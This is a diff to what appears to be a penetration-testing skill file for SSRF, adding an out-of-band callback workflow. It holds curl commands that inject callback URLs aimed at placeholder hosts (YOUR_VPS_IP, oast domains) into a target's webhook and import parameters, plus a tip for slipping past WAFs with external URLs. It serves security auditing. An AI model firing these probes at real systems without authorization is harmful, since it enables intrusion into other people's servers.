@@ -43,16 +43,37 @@ chains_with: [info-disclosure, rce, auth-bypass]
 
 ## Methodology
 
-1. **Baseline — does the server actually fetch?** Point the param at your own listener and watch
-   for an inbound hit:
+0. **OAST session up FIRST (mandatory for blind vectors)** — before injecting anything,
+   start the correlation lifecycle so every attempt carries a unique token:
+   ```bash
+   python3 -m engine.oast start --audit-dir .                 # → callback domain
+   python3 -m engine.oast token --audit-dir . --purpose blind-ssrf \
+     --vuln-class ssrf --target-url https://target/api/webhook --parameter url
+   # → {"token": "abc123…", "payload_url": "http://abc123….<domain>.oast.site/"}
+   # inject payload_url, then:
+   python3 -m engine.oast poll --audit-dir .                  # matched interactions only
+   python3 -m engine.oast evidence --audit-dir . --token abc123…   # evidence block
+   python3 -m engine.oast stop --audit-dir .                  # NEVER leave the listener running
+   ```
+   Rules: one token per (endpoint, parameter) pair; a `poll` match on a minted token is the
+   ONLY path to `Demonstrated` for blind SSRF; unmatched hits are internet background noise.
+   See skill `oob-interactions` for the full discipline (wait budgets for stored vectors,
+   self-hosted vs public oast.* confidentiality).
+
+1. **Baseline — does the server actually fetch?** Point the param at your OAST payload URL
+   (step 0) or your own listener and watch for an inbound hit:
    ```bash
    # own box running: python3 -m http.server 8000 (with access logging) or use interactsh
    curl -s -X POST https://target/api/webhook -d '{"url":"http://YOUR_VPS_IP:8000/ssrf-test"}' \
      -H "Content-Type: application/json"
-   # or with interactsh-client running:
-   curl -s "https://target/import?url=http://$(interactsh-client -v | grep -o '[a-z0-9]*\.oast\.fun')"
+   # or with the minted OAST payload:
+   curl -s -X POST https://target/api/webhook -d '{"url":"http://TOKEN.DOMAIN/"}' \
+     -H "Content-Type: application/json" && python3 -m engine.oast poll --audit-dir .
    ```
-   A hit on your listener = confirmed basic SSRF (even blind), before touching anything internal.
+   A correlated hit = confirmed basic SSRF (even blind), before touching anything internal.
+   Note: a WAF error on *internal* URLs (e.g. `Blocked illegal activity`) is itself partial
+   oracle evidence the fetch was attempted — escalate to an external OAST URL, which WAFs
+   typically allow.
 
 2. **Response-reflected (non-blind) check** — some apps return fetched content directly:
    ```bash
